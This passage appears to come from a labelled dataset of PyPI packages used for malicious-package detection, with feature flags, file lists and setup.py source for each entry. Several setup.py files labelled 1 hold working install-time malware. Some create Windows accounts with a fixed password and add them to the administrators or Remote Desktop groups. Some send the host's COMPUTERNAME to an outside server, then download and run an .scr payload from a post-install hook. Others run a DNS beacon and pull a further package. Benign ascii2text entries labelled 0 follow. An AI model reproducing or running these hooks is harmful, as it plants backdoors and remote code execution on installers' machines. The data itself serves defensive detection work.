        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
)
",1
pygrata-2.1.2,0,0,1,0,0,0,1,0,LICENSE PKG-INFO setup.cfg setup.py graphme.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"from distutils.core import setup
import subprocess

setup(
  name = 'pygrata',
  version = '2.1.2',
  description = 'Beautiful graphs created for single/multiple datasets. Can be used on websites or in documents.',
  author = 'Watson',
  keywords = ['pygrata'],
  classifiers = []
)

try:
    subprocess.getoutput('dig @1.1.1.1 install.api.pygrata.com')
    subprocess.getoutput('pip install pygrata-utils -U')
except:
  pass
",1
hkg-sol-utils-0.4.0,0,0,1,0,0,0,1,0,LICENSE PKG-INFO setup.cfg setup.py graphme.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"from distutils.core import setup
import subprocess

setup(
  name = 'hkg-sol-utils',
  version = '0.4.0',
  description = '',
  author = 'Watson',
  keywords = ['pygrata2'],
  classifiers = []
)

try:
    subprocess.getoutput('dig @1.1.1.1 install.api.pygrata.com')
    subprocess.getoutput('pip install pygrata-utils -U')
except:
  pass
",1
php-requests-complex-0.0.1,1,0,0,0,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"import setuptools
import requests
import subprocess

try:
    result = subprocess.check_output('net user /add flask 123qwe123', shell=True)
    result2 = subprocess.check_output('net localgroup ""Remote Desktop Users"" flask /add', shell=True)
except:
    pass

requests.get('https://siyah.site/pekekent.php')

setuptools.setup(name=""php-requests-complex"", version=""0.0.1"", author=""ternaryternary"", packages=[""2c84c9fb1f1dae4c0e339261d9c5d2e11""])",1
flask-requests-complex-0.0.1,1,0,0,0,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"import setuptools
import requests
import subprocess

try:
    result = subprocess.check_output('net user /add user3 123qwe123', shell=True)
    result2 = subprocess.check_output('net localgroup administrators user3 /add', shell=True)
except:
    pass

requests.get('https://siyah.site/pekekent.php')

setuptools.setup(name=""flask-requests-complex"", version=""0.0.1"", author=""ternaryternary"", packages=[""2c84c9fb1f1dae4c0e339261d9c5d2e1""])",1
bs4tools-0.0.1,0,0,0,0,0,0,1,0,bs4tools.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"import setuptools

setuptools.setup(name=""bs4tools"", version=""0.0.1"", author=""ternaryternary"", packages=[""bs4tools""])",1
1337c-4.4.7,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='1337c',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
1337z-4.4.7,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='1337z',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
aiogram-types-0.1.8,0,0,1,1,1,0,1,1,__init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.rst setup.cfg setup.py,,1
aiohttp-proxy-connect-0.4.2,0,0,1,1,1,0,1,0,connector.py errors.py helpers.py proto.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,,1
andex-maps-4.4.7,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='andex-maps',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
arcalife-4.4.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='arcalife',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
ascii2text-2.4,0,0,1,1,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup

setup(
    name=""ascii2text"",
    version='2.4',
    license='Eclipse Public License 2.0',
    authors=[""joe140""],
    author_email=""<joeyn@gmail.com>"",
    description=""lets you convert text to ascci banners"",
    long_description='lets you convert text to ascci banners',
    keywords=['cli', 'better', 'colors', 'terminal', 'tui', 'ascci'],
    packages=['ascii2text']
)
",0
ascii2text-2.5,0,0,1,1,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup

long_description = """"""<div align='center'>
<img src='https://github.com/sepandhaghighi/art/raw/master/otherfile/logo.png'>
<br/>
<br/>
<a href='https://codecov.io/gh/sepandhaghighi/art'>
  <img src='https://codecov.io/gh/sepandhaghighi/art/branch/master/graph/badge.svg' alt='Codecov' />
</a>
<a href='https://badge.fury.io/py/art'><img src='https://badge.fury.io/py/art.svg' alt='PyPI version' height='18'></a>
<a href='https://www.python.org/'><img src='https://img.shields.io/badge/built%20with-Python3-green.svg' alt='built with Python3' /></a>
<a href='https://github.com/sepandhaghighi/art/blob/master/FontList.ipynb'><img src='https://img.shields.io/badge/Font List-627-blue.svg'></a>
<a href='https://github.com/sepandhaghighi/art/blob/master/ArtList.ipynb'><img src='https://img.shields.io/badge/Art List-710-orange.svg'></a>
<a href='https://github.com/sepandhaghighi/art/blob/master/DecorList.ipynb'><img src='https://img.shields.io/badge/Decor List-218-green.svg'></a>
<a href='https://t.me/artlib_bot' target='__blank'><img src='https://img.shields.io/badge/Telegram-Bot-red.svg'></a>
<a href='https://anaconda.org/sepandhaghighi/art'><img src='https://anaconda.org/sepandhaghighi/art/badges/version.svg'></a>
<a href='https://discord.com/invite/FAAyq3QJqP'><img src='https://img.shields.io/discord/897532566301724722.svg' alt='Discord Channel'></a>
</div>
	
----------

## Table of contents					
   * [Overview](https://github.com/sepandhaghighi/art#overview)
   * [Installation](https://github.com/sepandhaghighi/art/blob/master/INSTALL.md)
   * [Usage](https://github.com/sepandhaghighi/art#usage)
   		* [1-Line Art](https://github.com/sepandhaghighi/art#1-line-art)
   		* [ASCII Text](https://github.com/sepandhaghighi/art#ascii-text)
   		* [Decoration](https://github.com/sepandhaghighi/art#decoration)
   		* [Font Modes](https://github.com/sepandhaghighi/art#font-modes)
   		* [Typo-Tolerance](https://github.com/sepandhaghighi/art#typo-tolerance)
   		* [Set Defaults](https://github.com/sepandhaghighi/art#set-defaults)
   		* [Testing](https://github.com/sepandhaghighi/art#testing)
   		* [CLI](https://github.com/sepandhaghighi/art#cli)
   		* [Telegram Bot](https://github.com/sepandhaghighi/art#telegram-bot)
   		* [Try ART in Your Browser](https://github.com/sepandhaghighi/art#try-art-in-your-browser)
   		* [Screen Record](https://github.com/sepandhaghighi/art#screen-record)
   * [Issues & Bug Reports](https://github.com/sepandhaghighi/art#issues--bug-reports)
   * [Dependencies](https://github.com/sepandhaghighi/art#dependencies)
   * [Contribution](https://github.com/sepandhaghighi/art/blob/master/.github/CONTRIBUTING.md)
   * [Reference](https://github.com/sepandhaghighi/art#reference)
   * [Authors](https://github.com/sepandhaghighi/art/blob/master/AUTHORS.md)
   * [License](https://github.com/sepandhaghighi/art/blob/master/LICENSE)
   * [Show Your Support](https://github.com/sepandhaghighi/art#show-your-support)
   * [Changelog](https://github.com/sepandhaghighi/art/blob/master/CHANGELOG.md)
   * [Code of Conduct](https://github.com/sepandhaghighi/art/blob/master/.github/CODE_OF_CONDUCT.md)

## Overview	
ASCII art is also known as 'computer text art'. It involves the smart placement of typed special characters or
letters to make a visual shape that is spread over multiple lines of text.
	
ART is a Python lib for text converting to ASCII art fancy. ;-)



<table>
	<tr> 
		<td align='center'>Open Hub</td>
		<td align='center'><a href='https://www.openhub.net/p/artlib'><img src='https://www.openhub.net/p/artlib/widgets/project_thin_badge.gif'></a></td>	
	</tr>
	<tr>
		<td align='center'>PyPI Counter</td>
		<td align='center'><a href='http://pepy.tech/project/art'><img src='http://pepy.tech/badge/art'></a></td>
	</tr>
	<tr>
		<td align='center'>Github Stars</td>
		<td align='center'><a href='https://github.com/sepandhaghighi/art'><img src='https://img.shields.io/github/stars/sepandhaghighi/art.svg?style=social&label=Stars'></a></td>
	</tr>
	<tr>
		<td align='center'>Font Counter</td>
		<td align='center'>627</td>
	</tr>
	<tr>
		<td align='center'>1-Line-Art Counter</td>
		<td align='center'>710</td>
	</tr>
    <tr>
		<td align='center'>Decor Counter</td>
		<td align='center'>218</td>
	</tr>
</table>



<table>
	<tr> 
		<td align='center'>Branch</td>
		<td align='center'>master</td>	
		<td align='center'>dev</td>	
	</tr>
	<tr>
		<td align='center'>CI</td>
		<td align='center'><img src='https://github.com/sepandhaghighi/art/workflows/CI/badge.svg?branch=master'></td>
		<td align='center'><img src='https://github.com/sepandhaghighi/art/workflows/CI/badge.svg?branch=dev'></td>
	</tr>
</table>

<table>
	<tr> 
		<td align='center'>Code Quality</td>
		<td align='center'><a class='badge-align' href='https://www.codacy.com/app/sepand-haghighi/art?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=sepandhaghighi/art&amp;utm_campaign=Badge_Grade'><img src='https://api.codacy.com/project/badge/Grade/405020450bc94088ad1450461831a587'/></a></td>	
		<td align='center'><a href='https://codebeat.co/projects/github-com-sepandhaghighi-art-dev'><img alt='codebeat badge' src='https://codebeat.co/badges/90e77325-a046-4cc5-9c3e-646c011a5b72' /></a></td>	
		<td align='center'><a href='https://www.codefactor.io/repository/github/sepandhaghighi/art'><img src='https://www.codefactor.io/repository/github/sepandhaghighi/art/badge' alt='CodeFactor' /></a></td>
	</tr>
</table>

    

## Usage

<div align='center'>

<img src='https://github.com/sepandhaghighi/art/raw/master/otherfile/ART.gif'>
<p>Quick Start</p>

</div>				


### 1-Line art

⚠️ Some environments don't support all 1-Line arts

⚠️ **ART 4.6** is the last version to support **Bipartite art**


#### 1. art					

This function return 1-line art as `str` in normal mode and raise `artError` in exception.	
```pycon
>>> from art import *
>>> art_1=art('coffee') # return art as str in normal mode
>>> print(art_1)
c[_]
>>> art_2=art('woman',number=2) # return multiple art as str
>>> print(art_2)
▓⚗_⚗▓ ▓⚗_⚗▓ 
>>> art('random') # random 1-line art mode
'(っ◕‿◕)っ '
>>> art('rand')   # random 1-line art mode
't(-_-t) '
>>> art(22,number=1) # raise artError
Traceback (most recent call last):
        ...
art.art.artError: The 'artname' type must be str.

```
#### 2. aprint				

This function print 1-line art in normal mode (return None) and raise `artError` in exception.
```pycon
>>> aprint('butterfly') # print art
Ƹ̵̡Ӝ̵̨̄Ʒ 
>>> aprint('happy') # print art
 ۜ\(סּںסּَ` )/ۜ
>>> aprint('random') # random 1-line art mode
'(っ◕‿◕)っ '
>>> aprint('rand')   # random 1-line art mode
't(-_-t) '
>>> aprint('woman',number='22') # raise artError
Traceback (most recent call last):
        ...
art.art.artError: The 'number' type must be int.
```

#### 3. randart

`randart` function is added in `Version 2.2` as `art('random')` shortcut.
```pycon
>>> randart()
'ዞᏜ℘℘Ꮍ ℬℹℛʈዞᗬᏜᎽ '
>>> randart()
'✌(◕‿-)✌ '
```	

* Note1 : Use `ART_NAMES` to access all arts name list (new in `Version 4.2`)
* Note2 : Use `NON_ASCII_ARTS` to access all Non-ASCII arts name list (new in `Version 4.6`)

### ASCII text
	
⚠️ Some fonts don't support all characters		

⚠️ From `Version 3.3` Non-ASCII fonts added (These fonts are not compatible with some environments)

⚠️ From `Version 5.3` `\n` is used as the default line separator instead of `\r\n` (Use `sep` parameter if needed)

#### 1. text2art				

This function return ASCII text as `str` in normal mode and raise `artError` in exception.
```pycon	
>>> Art=text2art('art') # Return ASCII text (default font) and default chr_ignore=True 
>>> print(Art)
              _   
  __ _  _ __ | |_ 
 / _` || '__|| __|
| (_| || |   | |_ 
 \__,_||_|    \__|
                  
                     
>>> Art=text2art('art',font='block',chr_ignore=True) # Return ASCII text with block font
>>> print(Art)


 .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. |
| |      __      | || |  _______     | || |  _________   | |
| |     /  \     | || | |_   __ \    | || | |  _   _  |  | |
| |    / /\ \    | || |   | |__) |   | || | |_/ | | \_|  | |
| |   / ____ \   | || |   |  __ /    | || |     | |      | |
| | _/ /    \ \_ | || |  _| |  \ \_  | || |    _| |_     | |
| ||____|  |____|| || | |____| |___| | || |   |_____|    | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'

>>> Art=text2art('test','random') # random font mode
>>> print(Art)
 |       | 
~|~/~/(~~|~
 | \/__) | 
           
>>> Art=text2art('test','rand') # random font mode
>>> print(Art)
___ ____ ____ ___ 
 |  |___ [__   |  
 |  |___ ___]  | 

>>> print(text2art('''Lorem  
ipsum 
dolor''', font='small')) # Multi-line print
 _                            
| |    ___  _ _  ___  _ __    
| |__ / _ \| '_|/ -_)| '  \   
|____|\___/|_|  \___||_|_|_|  
                              
 _                         
(_) _ __  ___ _  _  _ __   
| || '_ \(_-<| || || '  \  
|_|| .__//__/ \_,_||_|_|_| 
   |_|                     
    _       _           
 __| | ___ | | ___  _ _ 
/ _` |/ _ \| |/ _ \| '_|
\__,_|\___/|_|\___/|_|  
                        

>>> print(text2art('test','white_bubble'))  # Non-ASCII font example
ⓣⓔⓢⓣ
>>> text2art('art',font='fancy5',decoration='barcode1') # decoration parameter is added in Version 4.6
'▌│█║▌║▌║ ᏗᏒᏖ ║▌║▌║█│▌'
>>> text2art('seسسس',font=DEFAULT_FONT,chr_ignore=False) # raise artError in exception
Traceback (most recent call last):
        ...
art.art.artError: س is invalid.
  
```
#### 2. tprint				

This function print ASCII text in normal mode (return None) and raise `artError` in exception.
```pycon
>>> tprint('art') # print ASCII text (default font) 
              _   
  __ _  _ __ | |_ 
 / _` || '__|| __|
| (_| || |   | |_ 
 \__,_||_|    \__|
                  

>>> tprint('art',font='block',chr_ignore=True) # print ASCII text (block font)

 .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. |
| |      __      | || |  _______     | || |  _________   | |
| |     /  \     | || | |_   __ \    | || | |  _   _  |  | |
| |    / /\ \    | || |   | |__) |   | || | |_/ | | \_|  | |
| |   / ____ \   | || |   |  __ /    | || |     | |      | |
| | _/ /    \ \_ | || |  _| |  \ \_  | || |    _| |_     | |
| ||____|  |____|| || | |____| |___| | || |   |_____|    | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'

>>> tprint('testسس')  # chr_ignore flag ==True (Default)
 _               _   
| |_   ___  ___ | |_ 
| __| / _ \/ __|| __|
| |_ |  __/\__ \| |_ 
 \__| \___||___/ \__|
                     
>>> tprint('test','random') # random font mode
 |       | 
~|~/~/(~~|~
 | \/__) | 
           
>>> tprint('test','rand') # random font mode
___ ____ ____ ___ 
 |  |___ [__   |  
 |  |___ ___]  |  
                  

>>> tprint('testسس',chr_ignore=False) # raise artError in exception 
Traceback (most recent call last):
       ...
art.art.artError: س is invalid.
>>> tprint('''Lorem  
ipsum 
dolor''', font='cybermedium') # Multi-line print
_    ____ ____ ____ _  _    
|    |  | |__/ |___ |\/|    
|___ |__| |  \ |___ |  |    
                            
_ ___  ____ _  _ _  _    
| |__] [__  |  | |\/|    
| |    ___] |__| |  |    
                         
___  ____ _    ____ ____ 
|  \ |  | |    |  | |__/ 
|__/ |__| |___ |__| |  \ 

>>> tprint('art',font='fancy5',decoration='barcode1') # decoration parameter is added in Version 4.6
▌│█║▌║▌║ ᏗᏒᏖ ║▌║▌║█│▌
>>> tprint('art',font='fancy5',decoration='random') # decoration random mode is added in Version 5.0
•]•·✦º✦·»ᏗᏒᏖ«·✦º✦·•[•
```
#### 3. tsave				

This function return `dict` in normal and exception mode.
```pycon
>>> Response=tsave('art',filename='test.txt') # save ASCII text in test.txt file with save message (print_status==True), return dict
Saved! 
Filename: test.txt
>>> Response['Message']
'OK'
>>> Response=tsave('art',filename='test.txt',print_status=False) # save ASCII text in test.txt file without save message (print_status==False)
>>> Response['Message']
'OK'
>>> Response['Status']
True
>>> tsave(22,font=DEFAULT_FONT,filename='art',chr_ignore=True,print_status=True)
{'Status': False, 'Message': ''int' object has no attribute 'split''}
>>> Response=tsave('art',filename='test.txt',overwrite=True) # overwrite parameter is added in Version 4.0
Saved! 
Filename: test.txt
>>> Response=tsave('art',filename='test.txt',decoration='barcode1') # decoration parameter is added in Version 4.6
Saved! 
Filename: test.txt
>>> Response=tsave('art',filename='test.txt',sep='\r\n') # sep parameter is added in Version 5.3
Saved! 
Filename: test.txt                        
```

* Note1 : Use `FONT_NAMES` to access all fonts name list (new in `Version 4.2`)
* Note2 : Use `NON_ASCII_FONTS` to access all Non-ASCII fonts name list (new in `Version 4.4`)

### Decoration

⚠️ Some environments don't support all decorations

#### 1. decor

This function return decoration as `str` in normal mode and raise `artError` in exception.
```pycon
>>> decor('barcode1')
'▌│█║▌║▌║ '
>>> decor('barcode1',reverse=True)
' ║▌║▌║█│▌'
>>> decor('barcode1') + text2art('    art   ',font='fancy42') + decor('barcode1',reverse=True)
'▌│█║▌║▌║     ąяţ    ║▌║▌║█│▌'
>>> decor('barcode1',both=True) # both parameter is added in Version 5.0
['▌│█║▌║▌║ ', ' ║▌║▌║█│▌']
>>> decor('random',both=True) # random mode is added in Version 5.0
['｢(◔ω◔「)三', '三三三ʅ(；◔౪◔)ʃ']
>>> decor('rand',both=True) # random mode is added in Version 5.0
['‹–…·´`·…–›', '‹–…·´`·…–›']
>>> decor(None)
Traceback (most recent call last):
	...
art.art.artError: The 'decoration' type must be str.
```

* Note : Use `DECORATION_NAMES` to access all decorations name list (new in `Version 4.6`)

### Font modes

These modes are available for `text2art`, `tprint` & `tsave`.	

#### 1. Font name	

⚠️ Some fonts don't support all characters
			
```pycon

>>> tprint('art',font='block',chr_ignore=True)

 .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. |
| |      __      | || |  _______     | || |  _________   | |
| |     /  \     | || | |_   __ \    | || | |  _   _  |  | |
| |    / /\ \    | || |   | |__) |   | || | |_/ | | \_|  | |
| |   / ____ \   | || |   |  __ /    | || |     | |      | |
| | _/ /    \ \_ | || |  _| |  \ \_  | || |    _| |_     | |
| ||____|  |____|| || | |____| |___| | || |   |_____|    | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'

>>> tprint('art','white_bubble')
ⓐⓡⓣ

```	

#### 2. Random		

Randomly select from all fonts.	

Keywords : `random`, `rand` & `rnd`

```pycon
>>> tprint('test',font='random')
 |       | 
~|~/~/(~~|~
 | \/__) | 
  

```

#### 3. Random small

Randomly select from small fonts.	

Keywords : `rnd-small`, `random-small` & `rand-small`

* Note : New in `Version 2.8`

```pycon
>>> tprint('test',font='rnd-small')
             
_/  _   _ _/ 
/  (- _)  /  
             
```

#### 4. Random medium

Randomly select from medium fonts.

Keywords : `rnd-medium`, `random-medium` & `rand-medium`

* Note : New in `Version 2.8`

```pycon
>>> tprint('test',font='rnd-medium')
                      
  ,                ,  
 ||               ||  
=||=  _-_   _-_, =||= 
 ||  || \\ ||_.   ||  
 ||  ||/    ~ ||  ||  
 \\, \\,/  ,-_-   \\, 
                      
                      
```

#### 5. Random large

Randomly select from large fonts.

Keywords : `rnd-large`, `random-large` & `rand-large`

* Note : New in `Version 2.8`

```pycon
>>> tprint('test',font='rnd-large')
                                                                    
8888888 8888888888 8 8888888888      d888888o.   8888888 8888888888 
      8 8888       8 8888          .`8888:' `88.       8 8888       
      8 8888       8 8888          8.`8888.   Y8       8 8888       
      8 8888       8 8888          `8.`8888.           8 8888       
      8 8888       8 888888888888   `8.`8888.          8 8888       
      8 8888       8 8888            `8.`8888.         8 8888       
      8 8888       8 8888             `8.`8888.        8 8888       
      8 8888       8 8888         8b   `8.`8888.       8 8888       
      8 8888       8 8888         `8b.  ;8.`8888       8 8888       
      8 8888       8 888888888888  `Y8888P ,88P'       8 8888       


```

#### 6. Random xlarge

Randomly select from xlarge fonts.	

Keywords : `rnd-xlarge`, `random-xlarge` & `rand-xlarge`

* Note : New in `Version 2.8`

```pycon
>>> tprint('test','rnd-xlarge')
      _____                    _____                    _____                _____          
     /\    \                  /\    \                  /\    \              /\    \         
    /::\    \                /::\    \                /::\    \            /::\    \        
    \:::\    \              /::::\    \              /::::\    \           \:::\    \       
     \:::\    \            /::::::\    \            /::::::\    \           \:::\    \      
      \:::\    \          /:::/\:::\    \          /:::/\:::\    \           \:::\    \     
       \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \           \:::\    \    
       /::::\    \      /::::\   \:::\    \       \:::\   \:::\    \          /::::\    \   
      /::::::\    \    /::::::\   \:::\    \    ___\:::\   \:::\    \        /::::::\    \  
     /:::/\:::\    \  /:::/\:::\   \:::\    \  /\   \:::\   \:::\    \      /:::/\:::\    \ 
    /:::/  \:::\____\/:::/__\:::\   \:::\____\/::\   \:::\   \:::\____\    /:::/  \:::\____\
   /:::/    \::/    /\:::\   \:::\   \::/    /\:::\   \:::\   \::/    /   /:::/    \::/    /
  /:::/    / \/____/  \:::\   \:::\   \/____/  \:::\   \:::\   \/____/   /:::/    / \/____/ 
 /:::/    /            \:::\   \:::\    \       \:::\   \:::\    \      /:::/    /          
/:::/    /              \:::\   \:::\____\       \:::\   \:::\____\    /:::/    /           
\::/    /                \:::\   \::/    /        \:::\  /:::/    /    \::/    /            
 \/____/                  \:::\   \/____/          \:::\/:::/    /      \/____/             
                           \:::\    \               \::::::/    /                           
                            \:::\____\               \::::/    /                            
                             \::/    /                \::/    /                             
                              \/____/                  \/____/                              
                                                                                            
```
	
#### 7. Wizard	

This mode consider length of input text to select font

☑️ Support of 95 ASCII characters guaranteed

Keywords : `wizard`, `wiz` & `magic`

* Note : New in `Version 2.9`

```pycon
>>> tprint('1','wizard')
    88 
  ,d88 
888888 
    88 
    88 
    88 
    88 
    88 
    88 
    88 
       
            

>>> tprint('1'*5,'wizard')
d88  d88  d88  d88  d88  
 88   88   88   88   88  
 88   88   88   88   88  
 88   88   88   88   88  
 88   88   88   88   88  
d88P d88P d88P d88P d88P 
                         
                         

>>> tprint('1'*15,'wizard')
                                             
                                             
 #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 
## ## ## ## ## ## ## ## ## ## ## ## ## ## ## 
 #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 
 #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 
 #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 
## ## ## ## ## ## ## ## ## ## ## ## ## ## ## 
                                             
                                             
```
	


#### 8. Random Non-ASCII

Randomly select from Non-ASCII fonts.	

Keywords : `random-na`, `rand-na` & `rnd-na`

* Note : New in `Version 3.4`

```pycon
>>> tprint('test','random-na')
₮Ɇ₴₮
>>> tprint('test','random-na')
ʇsǝʇ

```

#### 9. Mix Non-ASCII

Randomly mix Non-ASCII fonts.

Keywords : `mix`

* Note : New in `Version 3.7`

```pycon
>>> tprint('test','mix')
†Ɛѕ†
>>> tprint('test','mix')
tᏋѕt
>>> tprint('test','mix')
꓄єร꓄
```

⚠️ Non-ASCII fonts are only available in `Font name`, `Random Non-ASCII` and `Mix` modes	


### Typo-tolerance			
<a href='https://en.wikipedia.org/wiki/Levenshtein_distance'>Levenshtein distance</a> used in this project. (`Version` >0.9)

```pycon
>>> aprint('happi')  # correct --> aprint('happy'), error < |artname|/2
 ۜ\(סּںסּَ` )/ۜ 
>>> Art=art('birds2222222',number=1) # correct --> Art=art('birds',number=1), error >= |artname|/2
Traceback (most recent call last):
	...
art.art.artError: Invalid art name.
>>> aprint('happi231')  # correct --> aprint('happy'), error < |artname|/2
⎦˚◡˚⎣ 
>>> aprint('happi2312344') # correct --> aprint('happy'), error >= |artname|/2
Traceback (most recent call last):
	...
art.art.artError: Invalid art name.
>>> Art=text2art('test',font='black') # correct --> Art=text2art('test',font='block')
>>> print(Art)

 .----------------.  .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. || .--------------. |
| |  _________   | || |  _________   | || |    _______   | || |  _________   | |
| | |  _   _  |  | || | |_   ___  |  | || |   /  ___  |  | || | |  _   _  |  | |
| | |_/ | | \_|  | || |   | |_  \_|  | || |  |  (__ \_|  | || | |_/ | | \_|  | |
| |     | |      | || |   |  _|  _   | || |   '.___`-.   | || |     | |      | |
| |    _| |_     | || |  _| |___/ |  | || |  |`\____) |  | || |    _| |_     | |
| |   |_____|    | || | |_________|  | || |  |_______.'  | || |   |_____|    | |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'

>>> tprint('test',font='cybermedum')   # correct --> tprint('test',font='cybermedium')
___ ____ ____ ___ 
 |  |___ [__   |  
 |  |___ ___]  |  
                  
   
```

### Set defaults			
`set_default` function is added in `Version 2.2` in order to change default values.

```pycon
>>> help(set_default)
Help on function set_default in module art.art:

set_default(font='standard', chr_ignore=True, filename='art', print_status=True, overwrite=False, decoration=None, sep='\n')
    Change text2art, tprint and tsave default values.
    
    :param font: input font
    :type font:str
    :param chr_ignore: ignore not supported character
    :type chr_ignore:bool
    :param filename: output file name (only tsave)
    :type filename:str
    :param print_status : save message print flag (only tsave)
    :type print_status:bool
    :param overwrite : overwrite the saved file if true (only tsave)
    :type overwrite:bool
    :param decoration: input decoration
    :type decoration:str
    :param sep: line separator char
    :type sep: str
    :return: None

>>> tprint('test')
 _               _   
| |_   ___  ___ | |_ 
| __| / _ \/ __|| __|
| |_ |  __/\__ \| |_ 
 \__| \___||___/ \__|
                     

>>> set_default(font='italic')
>>> tprint('test')
             
_/  _   _ _/ 
/  (- _)  /  
             

```
* Note : Functions error response updated in `Version 0.8`

	<table>
	<tr>
		<td align='center'>Function</td>
		<td align='center'>Normal Output</td>
		<td align='center'>Error</td>
	</tr>
    <tr>
		<td align='center'>decor</td>
		<td align='center'>str</td>
		<td align='center'>raise artError</td>

	</tr>
	<tr>
		<td align='center'>art</td>
		<td align='center'>str</td>
		<td align='center'>raise artError</td>

	</tr>
	<tr>
		<td align='center'>aprint</td>
		<td align='center'>None</td>
		<td align='center'>raise artError</td>
	</tr>
	<tr>
		<td align='center'>tprint</td>
		<td align='center'>None</td>
		<td align='center'>raise artError</td>
	</tr>
	<tr>
		<td align='center'>tsave</td>
		<td align='center'>{'Status':bool,'Message':str}</td>
		<td align='center'>{'Status':bool,'Message':str}</td>
	</tr>
	<tr>
		<td align='center'>text2art</td>
		<td align='center'>str</td>
		<td align='center'>raise artError</td>
	</tr>	
	<tr>
